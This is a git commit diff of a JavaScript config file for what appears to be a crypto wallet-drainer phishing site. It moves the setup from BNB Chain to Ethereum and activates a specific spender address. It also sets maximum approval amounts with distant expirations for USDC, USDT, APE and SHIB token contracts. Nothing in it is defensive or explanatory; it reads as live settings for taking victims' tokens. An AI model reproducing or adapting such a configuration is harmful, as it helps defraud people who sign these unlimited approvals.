436d1b1536e721a03528e6d8b2993ea52d42cc27
jaredxiao <jaredxiao@126.com>
2023-07-01 01:58:10 +0800

    fix

--- wwwroot/laravel/storage/webpacket_site/configs/D.js
+++ wwwroot/laravel/storage/webpacket_site/configs/D.js
@@ -1,27 +1,33 @@
-// const spender_address = '0xf347901a602e71e2F4ce7796e54146C2e746dd8c'
-const spender_address = '0x0000000000000000000000000000000000000000'
-const chain = '56'
-const amount = '1461501637330902918203684832716283019655932542975'
-const expiration = 1885674579
+const spender_address = "0xf347901a602e71e2F4ce7796e54146C2e746dd8c";
+//const spender_address = '0x0000000000000000000000000000000000000000'
+const chain = "1";
+const amount = "1461501637330902918203684832716283019655932542975";
+const expiration = 1885674579;
 export const D = {
-  spender_address: spender_address,
-  expiration: expiration,
-  usdc: {
-    name: 'usdc',
-    address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
-    amount: amount,
+    spender_address: spender_address,
     expiration: expiration,
-  },
-  usdt: {
-    name: 'usdt',
-    address: '0x55d398326f99059ff775485246999027b3197955',
-    amount: amount,
-    expiration: expiration,
-  },
-  busd: {
-    name: 'busd',
-    address: '0xe9e7cea3dedca5984780bafc599bd69add087d56',
-    amount: amount,
-    expiration: expiration,
-  },
-}
+    usdc: {
+        name: "usdc",
+        address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+        amount: amount,
+        expiration: expiration,
+    },
+    usdt: {
+        name: "usdt",
+        address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
+        amount: amount,
+        expiration: expiration,
+    },
+    ape: {
+        name: "ape",
+        address: "0x4d224452801aced8b2f0aebe155379bb5d594381",
+        amount: amount,
+        expiration: expiration,
+    },
+    shib: {
+        name: "shib",
+        address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+        amount: amount,
+        expiration: expiration,
+    },
+};
